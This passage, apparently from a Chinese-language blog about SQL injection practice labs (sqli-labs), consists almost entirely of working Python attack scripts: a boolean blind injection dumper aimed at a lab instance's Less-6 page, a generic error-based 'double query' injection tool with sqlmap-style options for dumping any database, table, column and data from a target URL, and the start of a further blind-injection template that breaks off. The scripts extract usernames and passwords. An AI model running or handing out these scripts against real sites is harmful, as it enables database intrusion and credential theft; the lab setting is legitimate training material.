class="number">0</span>, maxNum):</span><br><span class="line">        <span class="comment"># dump record i</span></span><br><span class="line">        table = <span class="string">""</span></span><br><span class="line">        flag_j = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">51</span>):</span><br><span class="line">            <span class="keyword">if</span> (flag_j):</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            flag_j = <span class="number">1</span></span><br><span class="line">            <span class="keyword">for</span> k <span class="keyword">in</span> ditt:</span><br><span class="line">                payload = <span class="string">"\" and substr((select table_name from information_schema.tables"</span> \</span><br><span class="line">                      <span class="string">" where table_schema=database() limit &#123;&#125;,1),&#123;&#125;,1)='&#123;&#125;' --+"</span>.format(i, j, k)</span><br><span class="line">                url = base + payload</span><br><span class="line">                html = session.get(url).content.decode()</span><br><span class="line">                <span class="keyword">if</span> <span class="string">"are"</span> <span class="keyword">in</span> html:</span><br><span class="line">                    table += k</span><br><span class="line">                    <span class="comment"># print(j, k)</span></span><br><span class="line">                    flag_j = <span class="number">0</span></span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(table == <span class="string">""</span>):</span><br><span class="line">            num = i</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        tables.append(table)</span><br><span class="line"></span><br><span class="line">    print(<span class="string">"dump tables: "</span>.upper(), num)</span><br><span class="line">    print(<span class="string">"table name: "</span>.upper())</span><br><span class="line">    <span class="keyword">for</span> item <span class="keyword">in</span> tables:</span><br><span class="line">        print(item)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dumpColumn</span><span class="params">(base, session, ditt, maxNum)</span>:</span></span><br><span class="line"></span><br><span class="line">    columns = []</span><br><span class="line">    num = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, maxNum):</span><br><span class="line">        column = <span class="string">""</span></span><br><span class="line">        flag_j = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">51</span>):</span><br><span class="line">            <span class="keyword">if</span> (flag_j):</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            flag_j = <span class="number">1</span></span><br><span class="line">            <span class="keyword">for</span> k <span class="keyword">in</span> ditt:</span><br><span class="line">                payload = <span class="string">"\"and substr((select column_name from information_schema.columns where "</span> \</span><br><span class="line">                          <span class="string">"table_schema=database() and table_name='users' limit &#123;&#125;,1),&#123;&#125;,1)='&#123;&#125;' --+"</span>.format(i, j, k)</span><br><span class="line">                url = base + payload</span><br><span class="line">                html = session.get(url).content.decode()</span><br><span class="line">                <span class="keyword">if</span> <span class="string">"are"</span> <span class="keyword">in</span> html:</span><br><span class="line">                    column += k</span><br><span class="line">                    <span class="comment"># print(j, k)</span></span><br><span class="line">                    flag_j = <span class="number">0</span></span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span>(column == <span class="string">""</span>):</span><br><span class="line">            num = i</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        columns.append(column)</span><br><span class="line"></span><br><span class="line">    print(<span class="string">"dump columns: "</span>.upper(), num)</span><br><span class="line">    print(<span class="string">"column name: "</span>.upper())</span><br><span class="line">    <span class="keyword">for</span> item <span class="keyword">in</span> columns:</span><br><span class="line">        print(item)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dumpData</span><span class="params">(base, session, ditt, columns, maxNum)</span>:</span></span><br><span class="line"></span><br><span class="line">    datas = &#123;&#125;</span><br><span class="line">    flag_i = <span class="number">0</span></span><br><span class="line">    num = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> column <span class="keyword">in</span> columns:</span><br><span class="line">        print(column.upper(), <span class="string">"\t"</span>, end=<span class="string">''</span>)</span><br><span class="line">    print(<span class="string">""</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, maxNum):</span><br><span class="line">        <span class="keyword">if</span>(flag_i):</span><br><span class="line">            num = i - <span class="number">1</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        flag_i = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> column <span class="keyword">in</span> columns:</span><br><span class="line">            value = <span class="string">""</span></span><br><span class="line">            flag_j = <span class="number">0</span></span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">51</span>):</span><br><span class="line">                <span class="keyword">if</span> (flag_j):</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">                flag_j = <span class="number">1</span></span><br><span class="line">                <span class="keyword">for</span> k <span class="keyword">in</span> ditt:</span><br><span class="line">                    payload = <span class="string">"\" and substr((select &#123;&#125; from security.users"</span> \</span><br><span class="line">                              <span class="string">" order by id limit &#123;&#125;,1),&#123;&#125;, 1)='&#123;&#125;' --+"</span>.format(column, i, j, k)</span><br><span class="line">                    url = base + payload</span><br><span class="line">                    html = session.get(url).content.decode()</span><br><span class="line">                    <span class="keyword">if</span> <span class="string">"are"</span> <span class="keyword">in</span> html:</span><br><span class="line">                        value += k</span><br><span class="line">                        <span class="comment">#print(j, k)</span></span><br><span class="line">                        flag_j = <span class="number">0</span></span><br><span class="line">                        <span class="keyword">break</span></span><br><span class="line">            <span class="comment"># print(data)</span></span><br><span class="line">            <span class="keyword">if</span> (value == <span class="string">""</span>):</span><br><span class="line">                <span class="keyword">if</span>(column == columns[<span class="number">0</span>]):</span><br><span class="line">                    flag_i = <span class="number">1</span></span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            datas[column] = value</span><br><span class="line">            print(value, <span class="string">"\t"</span>, end=<span class="string">''</span>)</span><br><span class="line">        print(<span class="string">""</span>)</span><br><span class="line">    print(<span class="string">"dump records: "</span>.upper(), num)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    ditt = string.ascii_letters + string.digits + <span class="string">"!@-"</span></span><br><span class="line">    baseUrl = <span class="string">"http://120.79.164.193:45539/Less-6/?id=1"</span></span><br><span class="line">    session = requests.session()</span><br><span class="line"></span><br><span class="line">    dumpDatabase(baseUrl, session, ditt)</span><br><span class="line">    dumpTable(baseUrl, session, ditt, maxNum=<span class="number">10</span>)</span><br><span class="line">    dumpColumn(baseUrl, session, ditt, maxNum=<span class="number">10</span>)</span><br><span class="line">    dumpData(baseUrl, session, ditt, [<span class="string">"id"</span>, <span class="string">"username"</span>, <span class="string">"password"</span>], maxNum=<span class="number">50</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
+
+<h4 id="双注入查询脚本"><a href="#双注入查询脚本" class="headerlink" title="双注入查询脚本"></a>双注入查询脚本</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding: utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">from</span> termcolor <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> optparse</span><br><span class="line"> </span><br><span class="line">fdata = []</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">judge_columns_num</span><span class="params">(url)</span>:</span></span><br><span class="line">         </span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">100</span>):</span><br><span class="line">		columns_num_url = url + <span class="string">'\''</span> + <span class="string">'order by '</span> + str(i) + <span class="string">'--+'</span></span><br><span class="line">		rsp = requests.get(columns_num_url)</span><br><span class="line">		rsp_content_length = rsp.headers[<span class="string">'content-length'</span>]</span><br><span class="line">		<span class="keyword">if</span> i==<span class="number">1</span>:</span><br><span class="line">			rsp_true_content_length = rsp_content_length</span><br><span class="line">		<span class="keyword">elif</span> rsp_content_length != rsp_true_content_length:</span><br><span class="line">			<span class="keyword">print</span> (colored(<span class="string">'column nums is '</span> + str(i<span class="number">-1</span>),<span class="string">"green"</span>,attrs=[<span class="string">"bold"</span>]))</span><br><span class="line">			columns_num = i</span><br><span class="line">			<span class="keyword">break</span></span><br><span class="line">	</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getDatabases</span><span class="params">(url)</span>:</span></span><br><span class="line"> </span><br><span class="line">	dbs_url = url +  <span class="string">"' union select 1,count(*),concat((select count(distinct+table_schema) from information_schema.tables),0x26,floor(rand(0)*2))x from information_schema.tables group by x;--+"</span></span><br><span class="line">	dbs_html = requests.get(dbs_url).content.decode()</span><br><span class="line">	dbs_num = int(re.search(<span class="string">r'\'(\d*?)&amp;'</span>,dbs_html).group(<span class="number">1</span>))</span><br><span class="line">	<span class="keyword">print</span> <span class="string">"databases num:"</span> + colored(dbs_num,<span class="string">"green"</span>,attrs=[<span class="string">"bold"</span>])</span><br><span class="line">	dbs = []</span><br><span class="line">	<span class="keyword">print</span> (<span class="string">"dbs name: "</span>)</span><br><span class="line">	<span class="keyword">for</span> dbIndex <span class="keyword">in</span> xrange(<span class="number">0</span>,dbs_num):</span><br><span class="line">		db_name_url = url + <span class="string">"' union select 1,count(*),concat((select distinct table_schema from information_schema.tables limit %d,1),0x26,floor(rand(0)*2))x from information_schema.columns group by x;--+"</span> % dbIndex</span><br><span class="line">		db_html = requests.get(db_name_url).content</span><br><span class="line">		db_name = re.search(<span class="string">r'\'(.*?)&amp;'</span>, db_html).group(<span class="number">1</span>)</span><br><span class="line">		dbs.append(db_name)</span><br><span class="line">		<span class="keyword">print</span> (colored(<span class="string">"\t%s"</span> % db_name,<span class="string">"green"</span>,attrs=[<span class="string">"bold"</span>]))</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getTables</span><span class="params">(url, db_name)</span>:</span></span><br><span class="line">	<span class="comment">#db_name_hex = "0x" + binascii.b2a_hex(db_name)</span></span><br><span class="line">	tables_num_url = url + <span class="string">"' union select 1,count(*),concat((select count(table_name) from information_schema.tables where table_schema='%s'),0x26,floor(rand(0)*2))x from information_schema.columns group by x;--+"</span> % db_name</span><br><span class="line">	tables_html = requests.get(tables_num_url).content</span><br><span class="line">	tables_num = int(re.search(<span class="string">r'\'(\d*?)&amp;'</span>,tables_html).group(<span class="number">1</span>))</span><br><span class="line">	<span class="keyword">print</span> (<span class="string">"databases %s，tables num: %d"</span> % (db_name, tables_num))</span><br><span class="line">	<span class="keyword">print</span> (<span class="string">"tables name: "</span>)</span><br><span class="line">	<span class="keyword">for</span> tableIndex <span class="keyword">in</span> xrange(<span class="number">0</span>,tables_num):</span><br><span class="line">		table_name_url = url + <span class="string">"'union select 1,count(*),concat((select table_name from information_schema.tables where table_schema='%s' limit %d,1),0x26,floor(rand(0)*2))x from information_schema.columns group by x;--+"</span> % (db_name, tableIndex)</span><br><span class="line">		table_html = requests.get(table_name_url).content</span><br><span class="line">		table_name = re.search(<span class="string">r'\'(.*?)&amp;'</span>,table_html).group(<span class="number">1</span>)</span><br><span class="line">		<span class="keyword">print</span> (colored(<span class="string">"\t%s"</span> % table_name,<span class="string">"green"</span>,attrs=[<span class="string">"bold"</span>]))</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getColumns</span><span class="params">(url,db_name,table_name)</span>:</span></span><br><span class="line">         </span><br><span class="line">	<span class="comment">#db_name_hex = "0x" + binascii.b2a_hex(db_name)</span></span><br><span class="line">	<span class="comment">#table_name_hex = "0x" + binascii.b2a_hex(table_name)</span></span><br><span class="line">	dataColumns_num_url = url + <span class="string">"' union select 1,count(*),concat((select count(column_name) from information_schema.columns where table_schema='%s' and table_name='%s' ),0x26,floor(rand(0)*2))x from information_schema.columns group by x;--+"</span> % (db_name,table_name)</span><br><span class="line">	dataColumns_html = requests.get(dataColumns_num_url).content</span><br><span class="line">	dataColumns_num = int(re.search(<span class="string">r'\'(\d*?)&amp;'</span>,dataColumns_html).group(<span class="number">1</span>))</span><br><span class="line">	<span class="keyword">print</span> (<span class="string">"table: %s，dataColumns num: %d"</span> % (table_name, dataColumns_num))</span><br><span class="line">	<span class="keyword">print</span> (<span class="string">"DataColumns name："</span>)</span><br><span class="line">	<span class="keyword">for</span> dataColumnIndex <span class="keyword">in</span> xrange(<span class="number">0</span>,dataColumns_num):</span><br><span class="line">		dataColumn_name_url = url + <span class="string">"' union select 1,count(*),concat((select column_name from information_schema.columns where table_schema='%s' and table_name='%s' limit %d,1),0x26,floor(rand(0)*2))x from information_schema.columns group by x;--+"</span> % (db_name,table_name,dataColumnIndex)</span><br><span class="line">		dataColumn_html = requests.get(dataColumn_name_url).content</span><br><span class="line">		dataColumn_name = re.search(<span class="string">r'\'(.*?)&amp;'</span>,dataColumn_html).group(<span class="number">1</span>)</span><br><span class="line">		<span class="keyword">print</span> (colored(<span class="string">"\t\t%s"</span> % dataColumn_name,<span class="string">"green"</span>,attrs=[<span class="string">"bold"</span>]))</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dumpData</span><span class="params">(url,db_name,table_name,inputColumns_name)</span>:</span></span><br><span class="line">         </span><br><span class="line">	<span class="comment">#db_name_hex = "0x" + binascii.b2a_hex(db_name)</span></span><br><span class="line">	<span class="comment">#table_name_hex = "0x" + binascii.b2a_hex(table_name)</span></span><br><span class="line">	</span><br><span class="line">	dataColumns_num_url = url + <span class="string">"' union select 1,count(*),concat((select count(*) from %s.%s),0x26,floor(rand(0)*2))x from information_schema.columns group by x;--+"</span> % (db_name,table_name)</span><br><span class="line">	data_html = requests.get(dataColumns_num_url).content</span><br><span class="line">	datas = int(re.search(<span class="string">r'\'(\d*?)&amp;'</span>,data_html).group(<span class="number">1</span>))</span><br><span class="line">	</span><br><span class="line">	</span><br><span class="line">	inputColumns = inputColumns_name.split(<span class="string">','</span>)</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">print</span> (colored(<span class="string">"Total datas: "</span> + str(datas),<span class="string">"green"</span>,attrs=[<span class="string">"bold"</span>]))</span><br><span class="line">	<span class="keyword">print</span> str(inputColumns_name) + <span class="string">":"</span></span><br><span class="line">	</span><br><span class="line">	<span class="keyword">for</span> inputColumnIndex <span class="keyword">in</span> xrange(<span class="number">0</span>,len(inputColumns)):</span><br><span class="line">		<span class="keyword">for</span> dataIndex <span class="keyword">in</span> xrange(<span class="number">0</span>,datas):</span><br><span class="line">		</span><br><span class="line">			dataColumn_name_url = url + <span class="string">"' union select 1,count(*),concat((select %s from %s.%s limit %d,1),0x26,floor(rand(0)*2))x from information_schema.columns group by x;--+"</span> % (inputColumns[inputColumnIndex],db_name,table_name,dataIndex)</span><br><span class="line">			data_html = requests.get(dataColumn_name_url).content</span><br><span class="line">			data = re.search(<span class="string">r'\'(.*?)&amp;'</span>,data_html).group(<span class="number">1</span>)</span><br><span class="line">			fdata.append(data)</span><br><span class="line">			<span class="keyword">print</span> (colored(<span class="string">"\t%s"</span> % data,<span class="string">"green"</span>,attrs=[<span class="string">"bold"</span>]))</span><br><span class="line">	<span class="keyword">for</span> inputc <span class="keyword">in</span> range(<span class="number">0</span>,len(inputColumns)):</span><br><span class="line">		<span class="keyword">print</span> str(inputColumns[inputc]) + <span class="string">"\t"</span>,</span><br><span class="line">	<span class="keyword">print</span> <span class="string">""</span></span><br><span class="line">	<span class="keyword">print</span> <span class="string">"+++++++++++++++++++++++++++++++++++++++++++++++++"</span></span><br><span class="line">	n = len(fdata) / len(inputColumns)</span><br><span class="line">	<span class="keyword">for</span> t <span class="keyword">in</span> range(<span class="number">0</span>,n):</span><br><span class="line">		<span class="keyword">for</span> d <span class="keyword">in</span> range(t,len(fdata),n):</span><br><span class="line">			<span class="keyword">print</span> colored(fdata[d],<span class="string">"green"</span>,attrs=[<span class="string">"bold"</span>]) + <span class="string">"\t"</span>,</span><br><span class="line">		<span class="keyword">print</span> <span class="string">""</span></span><br><span class="line">	<span class="keyword">print</span> <span class="string">"+++++++++++++++++++++++++++++++++++++++++++++++++"</span></span><br><span class="line">                 </span><br><span class="line">                 </span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">                 </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">usage</span><span class="params">()</span>:</span></span><br><span class="line">	<span class="keyword">print</span> <span class="string">"1. judge columns number: "</span></span><br><span class="line">	<span class="keyword">print</span> <span class="string">"python [script] -u [target url]"</span></span><br><span class="line">	<span class="keyword">print</span> <span class="string">"2. dump database："</span></span><br><span class="line">	<span class="keyword">print</span> <span class="string">"python [script] -u [target url] --dbs"</span></span><br><span class="line">	<span class="keyword">print</span> <span class="string">"3. dump tables: "</span></span><br><span class="line">	<span class="keyword">print</span> <span class="string">"python [script] -u [target url] -D [db] --tables"</span></span><br><span class="line">	<span class="keyword">print</span> <span class="string">"4. dump columns: "</span></span><br><span class="line">	<span class="keyword">print</span> <span class="string">"python [script] -u [target url] -D [db] -T [table] --columns"</span></span><br><span class="line">	<span class="keyword">print</span> <span class="string">"5. dump data: "</span></span><br><span class="line">	<span class="keyword">print</span> <span class="string">"python [script] -u [target url] -D [db] -T [table] -C [column]"</span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">         </span><br><span class="line">	parser = optparse.OptionParser(<span class="string">'python %prog '</span>+\</span><br><span class="line">                 <span class="string">'-h &lt;manual&gt;'</span>)</span><br><span class="line">	parser.add_option(<span class="string">'-u'</span>, dest=<span class="string">'tgtUrl'</span>, type=<span class="string">'string'</span>,\</span><br><span class="line">                 help=<span class="string">'input target url'</span>)</span><br><span class="line">	parser.add_option(<span class="string">'--dbs'</span>, dest=<span class="string">'dbs'</span>, action=<span class="string">'store_true'</span>, help=<span class="string">'get dbs'</span>)</span><br><span class="line">	parser.add_option(<span class="string">'--tables'</span>, dest=<span class="string">'tables'</span>, action=<span class="string">'store_true'</span>,\</span><br><span class="line">           help=<span class="string">'get tables'</span>)</span><br><span class="line">	parser.add_option(<span class="string">'--columns'</span>, dest=<span class="string">'columns'</span>, action=<span class="string">'store_true'</span>,\</span><br><span class="line">           help=<span class="string">'get columns'</span>)</span><br><span class="line"> </span><br><span class="line">	parser.add_option(<span class="string">'-D'</span>, dest=<span class="string">'db'</span>, type=<span class="string">'string'</span>, help=<span class="string">'choose a db'</span>)</span><br><span class="line">	parser.add_option(<span class="string">'-T'</span>, dest=<span class="string">'table'</span>, type=<span class="string">'string'</span>,\</span><br><span class="line">           help=<span class="string">'choose a table'</span>)</span><br><span class="line">	parser.add_option(<span class="string">'-C'</span>, dest=<span class="string">'column'</span>, type=<span class="string">'string'</span>,\</span><br><span class="line">           help=<span class="string">'choose column(s)'</span>)</span><br><span class="line">	parser.add_option(<span class="string">'--dump'</span>, dest=<span class="string">'data'</span>, action=<span class="string">'store_true'</span>,\</span><br><span class="line">           help=<span class="string">'get datas'</span>)</span><br><span class="line">     </span><br><span class="line">	(options, args) = parser.parse_args()</span><br><span class="line">         </span><br><span class="line">	url = options.tgtUrl</span><br><span class="line">	dbs = options.dbs</span><br><span class="line">	tables = options.tables</span><br><span class="line">	columns = options.columns</span><br><span class="line">	db = options.db</span><br><span class="line">	table = options.table</span><br><span class="line">	column = options.column</span><br><span class="line">	datas = options.data</span><br><span class="line">	</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">if</span> url <span class="keyword">and</span> (dbs <span class="keyword">is</span> <span class="literal">None</span> <span class="keyword">and</span> db <span class="keyword">is</span> <span class="literal">None</span> <span class="keyword">and</span> tables <span class="keyword">is</span> <span class="literal">None</span> <span class="keyword">and</span> table <span class="keyword">is</span> <span class="literal">None</span> <span class="keyword">and</span> columns <span class="keyword">is</span> <span class="literal">None</span> <span class="keyword">and</span> column <span class="keyword">is</span> <span class="literal">None</span> <span class="keyword">and</span> datas <span class="keyword">is</span> <span class="literal">None</span>):</span><br><span class="line">		judge_columns_num(url)</span><br><span class="line">		</span><br><span class="line">	<span class="keyword">if</span> url <span class="keyword">and</span> dbs:</span><br><span class="line">		getDatabases(url)</span><br><span class="line">	<span class="keyword">if</span> url <span class="keyword">and</span> db <span class="keyword">and</span> tables:</span><br><span class="line">		getTables(url,db)</span><br><span class="line">	<span class="keyword">if</span> url <span class="keyword">and</span> db <span class="keyword">and</span> table <span class="keyword">and</span> columns:</span><br><span class="line">		getColumns(url,db,table)</span><br><span class="line">	<span class="keyword">if</span> url <span class="keyword">and</span> db <span class="keyword">and</span> table <span class="keyword">and</span> column <span class="keyword">and</span> datas:</span><br><span class="line">		dumpData(url,db,table,column)</span><br><span class="line">                 </span><br><span class="line">	<span class="keyword">print</span> <span class="string">""</span>			 </span><br><span class="line">	</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
+
+<h2 id="脚本模板"><a href="#脚本模板" class="headerlink" title="脚本模板"></a>脚本模板</h2><h3 id="盲注-1"><a href="#盲注-1" class="headerlink" title="盲注"></a>盲注</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> optparse <span class="keyword">import</span> OptionParser</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line">parser=OptionParser()</span><br><span class="line"></span><br><span class="line">parser.add_option(<span class="string">"-D"</span>, <span class="string">"--database"</span>, action=<span class="string">"store"</span>,type=<span class="string">"string"</span>,dest=<span class="string">"database"</span>,help=<span class="string">"Please input test databases"</span>)</span><br><span class="line">parser.add_option(<span class="string">"-T"</span>, <span class="string">"--table"</span>,action=<span class="string">"store"</span>,type=<span class="string">"string"</span>,dest=<span class="string">"table"</span>,help=<span class="string">"Please input test table"</span>)</span><br><span class="line">parser.add_option(<span class="string">"-C"</span>, <span class="string">"--column"</span>,action=<span class="string">"store"</span>,type=<span class="string">"string"</span>,dest=<span class="string">"column"</span>,help=<span class="string">"Please input test column"</span>)</span><br><span class="line">parser.add_option(<span class="string">"-U"</span>,<span class="string">"--url"</span>, action=<span class="string">"store"</span>,type=<span class="string">"string"</span>,dest=<span class="string">"url"</span>,help=<span class="string">"Please input test url"</span>)</span><br><span class="line"></span><br><span class="line">(options,args) = parser.parse_args()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">if</span> options.url == <span 